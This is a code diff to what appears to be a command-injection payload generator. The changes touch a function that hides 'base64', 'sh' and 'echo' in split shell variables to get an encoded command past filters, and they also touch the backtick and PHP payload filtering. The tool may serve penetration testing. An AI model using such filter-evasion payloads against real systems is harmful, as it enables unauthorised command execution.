@@ -53,9 +53,12 @@ def _base64_pipe_bypass(command: str):
 
     b64_cmd = base64.b64encode(command.encode()).decode()
 
-    assign_base64, concat_base64 = utils._split_string_to_vars("base64")
-    assign_sh, concat_sh = utils._split_string_to_vars("sh")
-    assign_echo, concat_echo = utils._split_string_to_vars("echo")
+    used_vars = []
+    assign_base64, concat_base64 = utils._split_string_to_vars("base64", exclude_vars=used_vars)
+    used_vars.extend(_extract_var_names(assign_base64))
+    assign_sh, concat_sh = utils._split_string_to_vars("sh", exclude_vars=used_vars)
+    used_vars.extend(_extract_var_names(assign_sh))
+    assign_echo, concat_echo = utils._split_string_to_vars("echo", exclude_vars=used_vars)
 
     return (
         f"{assign_base64}{assign_sh}{assign_echo} "
@@ -63,13 +66,20 @@ def _base64_pipe_bypass(command: str):
     )
 
 
+def _extract_var_names(assign_str: str):
+    """Extract variable names from assignment string like 'a=bas;b=e64;'"""
+    names = []
+    for part in assign_str.split(";"):
+        if "=" in part:
+            names.append(part.split("=", 1)[0])
+    return names
+
+
 def _render_backtick_payloads(command: str):
     payloads = []
     for template in bypass_data.BACKTICK_TEMPLATES:
         if "{cmd}" in template:
             payloads.append(template.format(cmd=command))
-        elif "{path}" in template:
-            payloads.append(template.format(path=command))
     return payloads
 
 
@@ -265,9 +275,7 @@ def _filter_payloads_for_context(payloads, payload_context: str):
 
     matcher = _is_eval_safe_php_payload if normalized == "php_code" else _is_shell_style_payload
     filtered = [payload for payload in payloads if matcher(payload)]
-    if filtered:
-        return utils.dedupe_preserve_order(filtered)
-    return utils.dedupe_preserve_order(payloads)
+    return utils.dedupe_preserve_order(filtered)
 
 
 def _apply_upload_php_wrappers(payloads, php_version: float):
